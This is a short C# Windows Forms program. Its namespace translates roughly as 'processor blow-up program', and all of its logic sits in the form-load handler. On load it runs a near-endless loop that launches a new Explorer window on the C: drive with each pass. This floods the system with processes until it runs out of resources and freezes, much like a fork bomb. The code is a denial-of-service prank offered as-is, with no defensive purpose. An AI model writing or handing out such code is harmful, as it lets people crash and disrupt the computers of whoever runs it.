using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;

using System.Text;

using System.Windows.Forms;

namespace 处理器爆破程式
{
    public partial class High : Form
    {
        public High()
        {
            InitializeComponent();
        }

        private void High1_Load(object sender, EventArgs e)
        {
            for (int i = 1; i > 0; i++)
            {
                Process.Start("explorer.exe", @"c:/");
            } 
             
        }
    }
}
